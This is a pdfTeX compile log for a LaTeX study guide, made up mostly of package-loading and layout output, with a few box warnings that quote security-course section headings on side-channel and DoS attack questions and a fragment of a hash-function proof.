@@ -1,0 +1,1131 @@
+This is pdfTeX, Version 3.141592653-2.6-1.40.28 (TeX Live 2025) (preloaded format=pdflatex 2026.1.26)  13 OCT 2026 04:40
+entering extended mode
+ restricted \write18 enabled.
+ %&-line parsing enabled.
+**study_guide.tex
+(./study_guide.tex
+LaTeX2e <2025-11-01>
+L3 programming layer <2026-01-19>
+(/usr/local/texlive/2025/texmf-dist/tex/latex/base/article.cls
+Document Class: article 2025/01/22 v1.4n Standard LaTeX document class
+(/usr/local/texlive/2025/texmf-dist/tex/latex/base/size12.clo
+File: size12.clo 2025/01/22 v1.4n Standard LaTeX file (size option)
+)
+\c@part=\count275
+\c@section=\count276
+\c@subsection=\count277
+\c@subsubsection=\count278
+\c@paragraph=\count279
+\c@subparagraph=\count280
+\c@figure=\count281
+\c@table=\count282
+\abovecaptionskip=\skip49
+\belowcaptionskip=\skip50
+\bibindent=\dimen148
+)
+(/usr/local/texlive/2025/texmf-dist/tex/latex/amsmath/amsmath.sty
+Package: amsmath 2025/07/09 v2.17z AMS math features
+\@mathmargin=\skip51
+
+For additional information on amsmath, use the `?' option.
+(/usr/local/texlive/2025/texmf-dist/tex/latex/amsmath/amstext.sty
+Package: amstext 2024/11/17 v2.01 AMS text
+
+(/usr/local/texlive/2025/texmf-dist/tex/latex/amsmath/amsgen.sty
+File: amsgen.sty 1999/11/30 v2.0 generic functions
+\@emptytoks=\toks17
+\ex@=\dimen149
+))
+(/usr/local/texlive/2025/texmf-dist/tex/latex/amsmath/amsbsy.sty
+Package: amsbsy 1999/11/29 v1.2d Bold Symbols
+\pmbraise@=\dimen150
+)
+(/usr/local/texlive/2025/texmf-dist/tex/latex/amsmath/amsopn.sty
+Package: amsopn 2022/04/08 v2.04 operator names
+)
+\inf@bad=\count283
+LaTeX Info: Redefining \frac on input line 233.
+\uproot@=\count284
+\leftroot@=\count285
+LaTeX Info: Redefining \overline on input line 398.
+LaTeX Info: Redefining \colon on input line 409.
+\classnum@=\count286
+\DOTSCASE@=\count287
+LaTeX Info: Redefining \ldots on input line 495.
+LaTeX Info: Redefining \dots on input line 498.
+LaTeX Info: Redefining \cdots on input line 619.
+\Mathstrutbox@=\box53
+\strutbox@=\box54
+LaTeX Info: Redefining \big on input line 721.
+LaTeX Info: Redefining \Big on input line 722.
+LaTeX Info: Redefining \bigg on input line 723.
+LaTeX Info: Redefining \Bigg on input line 724.
+\big@size=\dimen151
+LaTeX Font Info:    Redeclaring font encoding OML on input line 742.
+LaTeX Font Info:    Redeclaring font encoding OMS on input line 743.
+\macc@depth=\count288
+LaTeX Info: Redefining \bmod on input line 904.
+LaTeX Info: Redefining \pmod on input line 909.
+LaTeX Info: Redefining \smash on input line 939.
+LaTeX Info: Redefining \relbar on input line 969.
+LaTeX Info: Redefining \Relbar on input line 970.
+\c@MaxMatrixCols=\count289
+\dotsspace@=\muskip17
+\c@parentequation=\count290
+\dspbrk@lvl=\count291
+\tag@help=\toks18
+\row@=\count292
+\column@=\count293
+\maxfields@=\count294
+\andhelp@=\toks19
+\eqnshift@=\dimen152
+\alignsep@=\dimen153
+\tagshift@=\dimen154
+\tagwidth@=\dimen155
+\totwidth@=\dimen156
+\lineht@=\dimen157
+\@envbody=\toks20
+\multlinegap=\skip52
+\multlinetaggap=\skip53
+\mathdisplay@stack=\toks21
+LaTeX Info: Redefining \[ on input line 2950.
+LaTeX Info: Redefining \] on input line 2951.
+)
+(/usr/local/texlive/2025/texmf-dist/tex/latex/amsfonts/amssymb.sty
+Package: amssymb 2013/01/14 v3.01 AMS font symbols
+
+(/usr/local/texlive/2025/texmf-dist/tex/latex/amsfonts/amsfonts.sty
+Package: amsfonts 2013/01/14 v3.01 Basic AMSFonts support
+\symAMSa=\mathgroup4
+\symAMSb=\mathgroup5
+LaTeX Font Info:    Redeclaring math symbol \hbar on input line 98.
+LaTeX Font Info:    Overwriting math alphabet `\mathfrak' in version `bold'
+(Font)                  U/euf/m/n --> U/euf/b/n on input line 106.
+))
+(/usr/local/texlive/2025/texmf-dist/tex/latex/amscls/amsthm.sty
+Package: amsthm 2020/05/29 v2.20.6
+\thm@style=\toks22
+\thm@bodyfont=\toks23
+\thm@headfont=\toks24
+\thm@notefont=\toks25
+\thm@headpunct=\toks26
+\thm@preskip=\skip54
+\thm@postskip=\skip55
+\thm@headsep=\skip56
+\dth@everypar=\toks27
+)
+(/usr/local/texlive/2025/texmf-dist/tex/latex/geometry/geometry.sty
+Package: geometry 2020/01/02 v5.9 Page Geometry
+
+(/usr/local/texlive/2025/texmf-dist/tex/latex/graphics/keyval.sty
+Package: keyval 2022/05/29 v1.15 key=value parser (DPC)
+\KV@toks@=\toks28
+)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/iftex/ifvtex.sty
+Package: ifvtex 2019/10/25 v1.7 ifvtex legacy package. Use iftex instead.
+
+(/usr/local/texlive/2025/texmf-dist/tex/generic/iftex/iftex.sty
+Package: iftex 2024/12/12 v1.0g TeX engine tests
+))
+\Gm@cnth=\count295
+\Gm@cntv=\count296
+\c@Gm@tempcnt=\count297
+\Gm@bindingoffset=\dimen158
+\Gm@wd@mp=\dimen159
+\Gm@odd@mp=\dimen160
+\Gm@even@mp=\dimen161
+\Gm@layoutwidth=\dimen162
+\Gm@layoutheight=\dimen163
+\Gm@layouthoffset=\dimen164
+\Gm@layoutvoffset=\dimen165
+\Gm@dimlist=\toks29
+)
+(/usr/local/texlive/2025/texmf-dist/tex/latex/enumitem/enumitem.sty
+Package: enumitem 2025/02/06 v3.11 Customized lists
+\labelindent=\skip57
+\enit@outerparindent=\dimen166
+\enit@toks=\toks30
+\enit@inbox=\box55
+\enit@count@id=\count298
+\enitdp@description=\count299
+)
+(/usr/local/texlive/2025/texmf-dist/tex/latex/xcolor/xcolor.sty
+Package: xcolor 2024/09/29 v3.02 LaTeX color extensions (UK)
+
+(/usr/local/texlive/2025/texmf-dist/tex/latex/graphics-cfg/color.cfg
+File: color.cfg 2016/01/02 v1.6 sample color configuration
+)
+Package xcolor Info: Driver file: pdftex.def on input line 274.
+
+(/usr/local/texlive/2025/texmf-dist/tex/latex/graphics-def/pdftex.def
+File: pdftex.def 2025/09/29 v1.2d Graphics/color driver for pdftex
+)
+(/usr/local/texlive/2025/texmf-dist/tex/latex/graphics/mathcolor.ltx)
+Package xcolor Info: Model `cmy' substituted by `cmy0' on input line 1349.
+Package xcolor Info: Model `hsb' substituted by `rgb' on input line 1353.
+Package xcolor Info: Model `RGB' extended on input line 1365.
+Package xcolor Info: Model `HTML' substituted by `rgb' on input line 1367.
+Package xcolor Info: Model `Hsb' substituted by `hsb' on input line 1368.
+Package xcolor Info: Model `tHsb' substituted by `hsb' on input line 1369.
+Package xcolor Info: Model `HSB' substituted by `hsb' on input line 1370.
+Package xcolor Info: Model `Gray' substituted by `gray' on input line 1371.
+Package xcolor Info: Model `wave' substituted by `hsb' on input line 1372.
+)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/soul/soul.sty
+Package: soul 2023-06-14 v3.1 Permit use of UTF-8 characters in soul (HO)
+
+(/usr/local/texlive/2025/texmf-dist/tex/generic/soul/soul-ori.sty
+Package: soul-ori 2023-06-14 v3.1 letterspacing/underlining (mf)
+\SOUL@word=\toks31
+\SOUL@lasttoken=\toks32
+\SOUL@syllable=\toks33
+\SOUL@cmds=\toks34
+\SOUL@buffer=\toks35
+\SOUL@token=\toks36
+\SOUL@syllgoal=\dimen167
+\SOUL@syllwidth=\dimen168
+\SOUL@charkern=\dimen169
+\SOUL@hyphkern=\dimen170
+\SOUL@dimen=\dimen171
+\SOUL@dimeni=\dimen172
+\SOUL@minus=\count300
+\SOUL@comma=\count301
+\SOUL@apo=\count302
+\SOUL@grave=\count303
+\SOUL@spaceskip=\skip58
+\SOUL@ttwidth=\dimen173
+\SOUL@uldp=\dimen174
+\SOUL@ulht=\dimen175
+)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/infwarerr/infwarerr.sty
+Package: infwarerr 2019/12/03 v1.5 Providing info/warning/error messages (HO)
+)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/etexcmds/etexcmds.sty
+Package: etexcmds 2019/12/15 v1.7 Avoid name clashes with e-TeX commands (HO)
+))
+(/usr/local/texlive/2025/texmf-dist/tex/latex/tcolorbox/tcolorbox.sty
+Package: tcolorbox 2025/11/28 version 6.9.0 text color boxes
+
+(/usr/local/texlive/2025/texmf-dist/tex/latex/pgf/frontendlayer/tikz.sty
+(/usr/local/texlive/2025/texmf-dist/tex/latex/pgf/basiclayer/pgf.sty
+(/usr/local/texlive/2025/texmf-dist/tex/latex/pgf/utilities/pgfrcs.sty
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/utilities/pgfutil-common.te
+x
+\pgfutil@everybye=\toks37
+\pgfutil@tempdima=\dimen176
+\pgfutil@tempdimb=\dimen177
+)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/utilities/pgfutil-latex.def
+\pgfutil@abb=\box56
+) (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/utilities/pgfrcs.code.tex
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/pgf.revision.tex)
+Package: pgfrcs 2025-08-29 v3.1.11a (3.1.11a)
+))
+Package: pgf 2025-08-29 v3.1.11a (3.1.11a)
+
+(/usr/local/texlive/2025/texmf-dist/tex/latex/pgf/basiclayer/pgfcore.sty
+(/usr/local/texlive/2025/texmf-dist/tex/latex/graphics/graphicx.sty
+Package: graphicx 2024/12/31 v1.2e Enhanced LaTeX Graphics (DPC,SPQR)
+
+(/usr/local/texlive/2025/texmf-dist/tex/latex/graphics/graphics.sty
+Package: graphics 2024/08/06 v1.4g Standard LaTeX Graphics (DPC,SPQR)
+
+(/usr/local/texlive/2025/texmf-dist/tex/latex/graphics/trig.sty
+Package: trig 2023/12/02 v1.11 sin cos tan (DPC)
+)
+(/usr/local/texlive/2025/texmf-dist/tex/latex/graphics-cfg/graphics.cfg
+File: graphics.cfg 2016/06/04 v1.11 sample graphics configuration
+)
+Package graphics Info: Driver file: pdftex.def on input line 106.
+)
+\Gin@req@height=\dimen178
+\Gin@req@width=\dimen179
+)
+(/usr/local/texlive/2025/texmf-dist/tex/latex/pgf/systemlayer/pgfsys.sty
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/systemlayer/pgfsys.code.tex
+Package: pgfsys 2025-08-29 v3.1.11a (3.1.11a)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/utilities/pgfkeys.code.tex
+\pgfkeys@pathtoks=\toks38
+\pgfkeys@temptoks=\toks39
+
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/utilities/pgfkeyslibraryfil
+tered.code.tex
+\pgfkeys@tmptoks=\toks40
+))
+\pgf@x=\dimen180
+\pgf@y=\dimen181
+\pgf@xa=\dimen182
+\pgf@ya=\dimen183
+\pgf@xb=\dimen184
+\pgf@yb=\dimen185
+\pgf@xc=\dimen186
+\pgf@yc=\dimen187
+\pgf@xd=\dimen188
+\pgf@yd=\dimen189
+\w@pgf@writea=\write3
+\r@pgf@reada=\read2
+\c@pgf@counta=\count304
+\c@pgf@countb=\count305
+\c@pgf@countc=\count306
+\c@pgf@countd=\count307
+\t@pgf@toka=\toks41
+\t@pgf@tokb=\toks42
+\t@pgf@tokc=\toks43
+\pgf@sys@id@count=\count308
+
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/systemlayer/pgf.cfg
+File: pgf.cfg 2025-08-29 v3.1.11a (3.1.11a)
+)
+Driver file for pgf: pgfsys-pdftex.def
+
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/systemlayer/pgfsys-pdftex.d
+ef
+File: pgfsys-pdftex.def 2025-08-29 v3.1.11a (3.1.11a)
+
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/systemlayer/pgfsys-common-p
+df.def
+File: pgfsys-common-pdf.def 2025-08-29 v3.1.11a (3.1.11a)
+)))
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/systemlayer/pgfsyssoftpath.
+code.tex
+File: pgfsyssoftpath.code.tex 2025-08-29 v3.1.11a (3.1.11a)
+\pgfsyssoftpath@smallbuffer@items=\count309
+\pgfsyssoftpath@bigbuffer@items=\count310
+)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/systemlayer/pgfsysprotocol.
+code.tex
+File: pgfsysprotocol.code.tex 2025-08-29 v3.1.11a (3.1.11a)
+))
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/basiclayer/pgfcore.code.tex
+Package: pgfcore 2025-08-29 v3.1.11a (3.1.11a)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/math/pgfmath.code.tex
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/math/pgfmathutil.code.tex)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/math/pgfmathparser.code.tex
+\pgfmath@dimen=\dimen190
+\pgfmath@count=\count311
+\pgfmath@box=\box57
+\pgfmath@toks=\toks44
+\pgfmath@stack@operand=\toks45
+\pgfmath@stack@operation=\toks46
+)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.code.
+tex)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.basic
+.code.tex)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.trigo
+nometric.code.tex)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.rando
+m.code.tex)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.compa
+rison.code.tex)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.base.
+code.tex)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.round
+.code.tex)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.misc.
+code.tex)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.integ
+erarithmetics.code.tex)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/math/pgfmathcalc.code.tex)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/math/pgfmathfloat.code.tex
+\c@pgfmathroundto@lastzeros=\count312
+)) (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/math/pgfint.code.tex)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/basiclayer/pgfcorepoints.co
+de.tex
+File: pgfcorepoints.code.tex 2025-08-29 v3.1.11a (3.1.11a)
+\pgf@picminx=\dimen191
+\pgf@picmaxx=\dimen192
+\pgf@picminy=\dimen193
+\pgf@picmaxy=\dimen194
+\pgf@pathminx=\dimen195
+\pgf@pathmaxx=\dimen196
+\pgf@pathminy=\dimen197
+\pgf@pathmaxy=\dimen198
+\pgf@xx=\dimen199
+\pgf@xy=\dimen256
+\pgf@yx=\dimen257
+\pgf@yy=\dimen258
+\pgf@zx=\dimen259
+\pgf@zy=\dimen260
+)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/basiclayer/pgfcorepathconst
+ruct.code.tex
+File: pgfcorepathconstruct.code.tex 2025-08-29 v3.1.11a (3.1.11a)
+\pgf@path@lastx=\dimen261
+\pgf@path@lasty=\dimen262
+)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/basiclayer/pgfcorepathusage
+.code.tex
+File: pgfcorepathusage.code.tex 2025-08-29 v3.1.11a (3.1.11a)
+\pgf@shorten@end@additional=\dimen263
+\pgf@shorten@start@additional=\dimen264
+)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/basiclayer/pgfcorescopes.co
+de.tex
+File: pgfcorescopes.code.tex 2025-08-29 v3.1.11a (3.1.11a)
+\pgfpic=\box58
+\pgf@hbox=\box59
+\pgf@layerbox@main=\box60
+\pgf@picture@serial@count=\count313
+)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/basiclayer/pgfcoregraphicst
+ate.code.tex
+File: pgfcoregraphicstate.code.tex 2025-08-29 v3.1.11a (3.1.11a)
+\pgflinewidth=\dimen265
+)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/basiclayer/pgfcoretransform
+ations.code.tex
+File: pgfcoretransformations.code.tex 2025-08-29 v3.1.11a (3.1.11a)
+\pgf@pt@x=\dimen266
+\pgf@pt@y=\dimen267
+\pgf@pt@temp=\dimen268
+)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/basiclayer/pgfcorequick.cod
+e.tex
+File: pgfcorequick.code.tex 2025-08-29 v3.1.11a (3.1.11a)
+)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/basiclayer/pgfcoreobjects.c
+ode.tex
+File: pgfcoreobjects.code.tex 2025-08-29 v3.1.11a (3.1.11a)
+)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/basiclayer/pgfcorepathproce
+ssing.code.tex
+File: pgfcorepathprocessing.code.tex 2025-08-29 v3.1.11a (3.1.11a)
+)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/basiclayer/pgfcorearrows.co
+de.tex
+File: pgfcorearrows.code.tex 2025-08-29 v3.1.11a (3.1.11a)
+\pgfarrowsep=\dimen269
+)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/basiclayer/pgfcoreshade.cod
+e.tex
+File: pgfcoreshade.code.tex 2025-08-29 v3.1.11a (3.1.11a)
+\pgf@max=\dimen270
+\pgf@sys@shading@range@num=\count314
+\pgf@shadingcount=\count315
+)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/basiclayer/pgfcoreimage.cod
+e.tex
+File: pgfcoreimage.code.tex 2025-08-29 v3.1.11a (3.1.11a)
+)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/basiclayer/pgfcoreexternal.
+code.tex
+File: pgfcoreexternal.code.tex 2025-08-29 v3.1.11a (3.1.11a)
+\pgfexternal@startupbox=\box61
+)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/basiclayer/pgfcorelayers.co
+de.tex
+File: pgfcorelayers.code.tex 2025-08-29 v3.1.11a (3.1.11a)
+)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/basiclayer/pgfcoretranspare
+ncy.code.tex
+File: pgfcoretransparency.code.tex 2025-08-29 v3.1.11a (3.1.11a)
+)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/basiclayer/pgfcorepatterns.
+code.tex
+File: pgfcorepatterns.code.tex 2025-08-29 v3.1.11a (3.1.11a)
+)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/basiclayer/pgfcorerdf.code.
+tex
+File: pgfcorerdf.code.tex 2025-08-29 v3.1.11a (3.1.11a)
+)))
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/modules/pgfmoduleshapes.cod
+e.tex
+File: pgfmoduleshapes.code.tex 2025-08-29 v3.1.11a (3.1.11a)
+\pgfnodeparttextbox=\box62
+)
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/modules/pgfmoduleplot.code.
+tex
+File: pgfmoduleplot.code.tex 2025-08-29 v3.1.11a (3.1.11a)
+)
+(/usr/local/texlive/2025/texmf-dist/tex/latex/pgf/compatibility/pgfcomp-version
+-0-65.sty
+Package: pgfcomp-version-0-65 2025-08-29 v3.1.11a (3.1.11a)
+\pgf@nodesepstart=\dimen271
+\pgf@nodesepend=\dimen272
+)
+(/usr/local/texlive/2025/texmf-dist/tex/latex/pgf/compatibility/pgfcomp-version
+-1-18.sty
+Package: pgfcomp-version-1-18 2025-08-29 v3.1.11a (3.1.11a)
+))
+(/usr/local/texlive/2025/texmf-dist/tex/latex/pgf/utilities/pgffor.sty
+(/usr/local/texlive/2025/texmf-dist/tex/latex/pgf/utilities/pgfkeys.sty
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/utilities/pgfkeys.code.tex)
+) (/usr/local/texlive/2025/texmf-dist/tex/latex/pgf/math/pgfmath.sty
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/math/pgfmath.code.tex))
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/utilities/pgffor.code.tex
+Package: pgffor 2025-08-29 v3.1.11a (3.1.11a)
+\pgffor@iter=\dimen273
+\pgffor@skip=\dimen274
+\pgffor@stack=\toks47
+\pgffor@toks=\toks48
+))
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/frontendlayer/tikz/tikz.cod
+e.tex
+Package: tikz 2025-08-29 v3.1.11a (3.1.11a)
+
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/libraries/pgflibraryplothan
+dlers.code.tex
+File: pgflibraryplothandlers.code.tex 2025-08-29 v3.1.11a (3.1.11a)
+\pgf@plot@mark@count=\count316
+\pgfplotmarksize=\dimen275
+)
+\tikz@lastx=\dimen276
+\tikz@lasty=\dimen277
+\tikz@lastxsaved=\dimen278
+\tikz@lastysaved=\dimen279
+\tikz@lastmovetox=\dimen280
+\tikz@lastmovetoy=\dimen281
+\tikzleveldistance=\dimen282
+\tikzsiblingdistance=\dimen283
+\tikz@figbox=\box63
+\tikz@figbox@bg=\box64
+\tikz@tempbox=\box65
+\tikz@tempbox@bg=\box66
+\tikztreelevel=\count317
+\tikznumberofchildren=\count318
+\tikznumberofcurrentchild=\count319
+\tikz@fig@count=\count320
+
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/modules/pgfmodulematrix.cod
+e.tex
+File: pgfmodulematrix.code.tex 2025-08-29 v3.1.11a (3.1.11a)
+\pgfmatrixcurrentrow=\count321
+\pgfmatrixcurrentcolumn=\count322
+\pgf@matrix@numberofcolumns=\count323
+)
+\tikz@expandcount=\count324
+
+(/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/frontendlayer/tikz/librarie
+s/tikzlibrarytopaths.code.tex
+File: tikzlibrarytopaths.code.tex 2025-08-29 v3.1.11a (3.1.11a)
+)))
+(/usr/local/texlive/2025/texmf-dist/tex/latex/tools/verbatim.sty
+Package: verbatim 2024-01-22 v1.5x LaTeX2e package for verbatim enhancements
+\every@verbatim=\toks49
+\verbatim@line=\toks50
+\verbatim@in@stream=\read3
+)
+(/usr/local/texlive/2025/texmf-dist/tex/latex/environ/environ.sty
+Package: environ 2014/05/04 v0.3 A new way to define environments
+
+(/usr/local/texlive/2025/texmf-dist/tex/latex/trimspaces/trimspaces.sty
+Package: trimspaces 2009/09/17 v1.1 Trim spaces around a token list
+))
+(/usr/local/texlive/2025/texmf-dist/tex/latex/etoolbox/etoolbox.sty
+Package: etoolbox 2025/10/02 v2.5m e-TeX tools for LaTeX (JAW)
+\etb@tempcnta=\count325
+)
+\tcb@titlebox=\box67
+\tcb@upperbox=\box68
+\tcb@lowerbox=\box69
+\tcb@phantombox=\box70
+\c@tcbbreakpart=\count326
+\c@tcblayer=\count327
+\c@tcolorbox@number=\count328
+\l__tcobox_tmpa_box=\box71
+\l__tcobox_tmpa_dim=\dimen284
+\tcb@temp=\box72
+\tcb@temp=\box73
+\tcb@temp=\box74
+\tcb@temp=\box75
+)
+(/usr/local/texlive/2025/texmf-dist/tex/latex/tcolorbox/tcbskins.code.tex
+Library (tcolorbox): 'tcbskins.code.tex' version '6.9.0'
+(/usr/local/texlive/2025/texmf-dist/tex/latex/tikzfill/tikzfill.image.sty
+Package: tikzfill.image 2023/08/08 v1.0.1 Image filling library for TikZ
+
+(/usr/local/texlive/2025/texmf-dist/tex/latex/tikzfill/tikzfill-common.sty
+Package: tikzfill-common 2023/08/08 v1.0.1 Auxiliary code for tikzfill
+)
+(/usr/local/texlive/2025/texmf-dist/tex/latex/tikzfill/tikzlibraryfill.image.co
+de.tex
+File: tikzlibraryfill.image.code.tex 2023/08/08 v1.0.1 Image filling library
+\l__tikzfill_img_box=\box76
+))
+(/usr/local/texlive/2025/texmf-dist/tex/latex/tcolorbox/tcbskinsjigsaw.code.tex
+Library (tcolorbox): 'tcbskinsjigsaw.code.tex' version '6.9.0'
+))
+(/usr/local/texlive/2025/texmf-dist/tex/latex/tcolorbox/tcbbreakable.code.tex
+Library (tcolorbox): 'tcbbreakable.code.tex' version '6.9.0'
+(/usr/local/texlive/2025/texmf-dist/tex/latex/pdfcol/pdfcol.sty
+Package: pdfcol 2022-09-21 v1.7 Handle new color stacks for pdfTeX (HO)
+
+(/usr/local/texlive/2025/texmf-dist/tex/generic/ltxcmds/ltxcmds.sty
+Package: ltxcmds 2023-12-04 v1.26 LaTeX kernel commands for general use (HO)
+))
+Package pdfcol Info: New color stack `tcb@breakable' = 1 on input line 23.
+\tcb@testbox=\box77
+\tcb@totalupperbox=\box78
+\tcb@totallowerbox=\box79
+)
+\enitdp@tightitem=\count329
+
+(/usr/local/texlive/2025/texmf-dist/tex/latex/l3backend/l3backend-pdftex.def
+File: l3backend-pdftex.def 2025-10-09 L3 backend support: PDF output (pdfTeX)
+\l__color_backend_stack_int=\count330
+)
+(./study_guide.aux)
+\openout1 = `study_guide.aux'.
+
+LaTeX Font Info:    Checking defaults for OML/cmm/m/it on input line 66.
+LaTeX Font Info:    ... okay on input line 66.
+LaTeX Font Info:    Checking defaults for OMS/cmsy/m/n on input line 66.
+LaTeX Font Info:    ... okay on input line 66.
+LaTeX Font Info:    Checking defaults for OT1/cmr/m/n on input line 66.
+LaTeX Font Info:    ... okay on input line 66.
+LaTeX Font Info:    Checking defaults for T1/cmr/m/n on input line 66.
+LaTeX Font Info:    ... okay on input line 66.
+LaTeX Font Info:    Checking defaults for TS1/cmr/m/n on input line 66.
+LaTeX Font Info:    ... okay on input line 66.
+LaTeX Font Info:    Checking defaults for OMX/cmex/m/n on input line 66.
+LaTeX Font Info:    ... okay on input line 66.
+LaTeX Font Info:    Checking defaults for U/cmr/m/n on input line 66.
+LaTeX Font Info:    ... okay on input line 66.
+
+*geometry* driver: auto-detecting
+*geometry* detected driver: pdftex
+*geometry* verbose mode - [ preamble ] result:
+* driver: pdftex
+* paper: a4paper
+* layout: <same size as paper>
+* layoutoffset:(h,v)=(0.0pt,0.0pt)
+* modes: 
+* h-part:(L,W,R)=(72.26999pt, 452.9679pt, 72.26999pt)
+* v-part:(T,H,B)=(72.26999pt, 700.50687pt, 72.26999pt)
+* \paperwidth=597.50787pt
+* \paperheight=845.04684pt
+* \textwidth=452.9679pt
+* \textheight=700.50687pt
+* \oddsidemargin=0.0pt
+* \evensidemargin=0.0pt
+* \topmargin=-37.0pt
+* \headheight=12.0pt
+* \headsep=25.0pt
+* \topskip=12.0pt
+* \footskip=30.0pt
+* \marginparwidth=35.0pt
+* \marginparsep=10.0pt
+* \columnsep=10.0pt
+* \skip\footins=10.8pt plus 4.0pt minus 2.0pt
+* \hoffset=0.0pt
+* \voffset=0.0pt
+* \mag=1000
+* \@twocolumnfalse
+* \@twosidefalse
+* \@mparswitchfalse
+* \@reversemarginfalse
+* (1in=72.27pt=25.4mm, 1cm=28.453pt)
+
+(/usr/local/texlive/2025/texmf-dist/tex/context/base/mkii/supp-pdf.mkii
+[Loading MPS to PDF converter (version 2006.09.02).]
+\scratchcounter=\count331
+\scratchdimen=\dimen285
+\scratchbox=\box80
+\nofMPsegments=\count332
+\nofMParguments=\count333
+\everyMPshowfont=\toks51
+\MPscratchCnt=\count334
+\MPscratchDim=\dimen286
+\MPnumerator=\count335
+\makeMPintoPDFobject=\count336
+\everyMPtoPDFconversion=\toks52
+) (/usr/local/texlive/2025/texmf-dist/tex/latex/epstopdf-pkg/epstopdf-base.sty
+Package: epstopdf-base 2020-01-24 v2.11 Base part for package epstopdf
+Package epstopdf-base Info: Redefining graphics rule for `.eps' on input line 4
+85.
+
+(/usr/local/texlive/2025/texmf-dist/tex/latex/latexconfig/epstopdf-sys.cfg
+File: epstopdf-sys.cfg 2010/07/13 v1.3 Configuration of (r)epstopdf for TeX Liv
+e
+))
+LaTeX Font Info:    Trying to load font information for U+msa on input line 71.
+
+
+(/usr/local/texlive/2025/texmf-dist/tex/latex/amsfonts/umsa.fd
+File: umsa.fd 2013/01/14 v3.01 AMS symbols A
+)
+LaTeX Font Info:    Trying to load font information for U+msb on input line 71.
+
+
+(/usr/local/texlive/2025/texmf-dist/tex/latex/amsfonts/umsb.fd
+File: umsb.fd 2013/01/14 v3.01 AMS symbols B
+)
+(./study_guide.toc
+Overfull \hbox (12.69563pt too wide) in paragraph at lines 2--2
+ [] []\OT1/cmr/bx/n/12 Question Type 2: Cache/timing side-channel at-tack anal-
+y-sis and constant- 
+ []
+
+
+Overfull \hbox (40.00668pt too wide) in paragraph at lines 10--10
+ [] []\OT1/cmr/bx/n/12 Question Type 10: DoS at-tack con-struc-tion and coun-te
+r-mea-sure/responsibility 
+ []
+
+)
+\tf@toc=\write4
+\openout4 = `study_guide.toc'.
+
+ [1
+
+{/usr/local/texlive/2025/texmf-var/fonts/map/pdftex/updmap/pdftex.map}]
+[2{/usr/local/texlive/2025/texmf-dist/fonts/enc/dvips/cm-super/cm-super-ts1.enc
+}] [3] [4] [5] [6] [7] [8]
+Underfull \hbox (badness 2035) in paragraph at lines 170--171
+\OT1/cmr/m/n/12 tion). Sup-pose $\OML/cmm/m/it/12 H$ \OT1/cmr/m/n/12 were NOT o
+ne-way, i.e. there is an ef-fi-cient
+ []
+
+
+Underfull \hbox (badness 1189) in paragraph at lines 170--171
+\OT1/cmr/m/n/12 func-tion $\OML/cmm/m/it/12 g$ \OT1/cmr/m/n/12 with $\OML/cmm/m
+/it/12 H\OT1/cmr/m/n/12 (\OML/cmm/m/it/12 g\OT1/cmr/m/n/12 (\OML/cmm/m/it/12 h\
